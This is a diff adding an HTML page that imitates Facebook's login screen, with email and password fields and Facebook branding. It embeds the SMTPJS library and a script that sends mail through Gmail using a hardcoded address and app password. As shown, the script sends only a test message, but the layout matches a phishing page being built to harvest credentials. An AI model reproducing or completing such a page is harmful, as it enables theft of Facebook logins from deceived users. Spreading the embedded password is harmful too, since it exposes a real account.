@@ -1,0 +1,47 @@
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Facebook Login Page</title>
+    <link rel="stylesheet" href="stylesheet.css" />
+  </head>
+  <body>
+    <script src=
+    "https://smtpjs.com/v3/smtp.js">
+  </script>
+  
+  <script type="text/javascript">
+    function sendEmail() {
+      Email.send({
+        Host: "smtp.gmail.com",
+        Username: "theapakalex@gmail.com",
+        Password: "tgpl imsw fbhe gwgv",
+        To: 'theapakalex@gmail.com',
+        From: "theapakalex@gmail.com",
+        Subject: "Sending Email using javascript",
+        Body: "Well that was easy!!",
+      })
+        .then(function (message) {
+          alert("mail sent successfully")
+        });
+    }
+  </script>
+    <div class="content">
+      <div class="flex-div">
+        <div class="name-content">
+          <h1 class="logo">Facebook</h1>
+          <p>Connect with friends and the world around you on Facebook.</p>
+        </div>
+          <form>
+            <input type="text" placeholder="Email or Phone Number" required />
+            <input type="password" placeholder="Password" required>
+            <button class="login">Log In</button>
+            <a href="#">Forgot Password ?</a>
+            <hr>
+            <button class="create-account">Create New Account</button>
+          </form>
+      </div>
+    </div>
+  </body>
+</html>
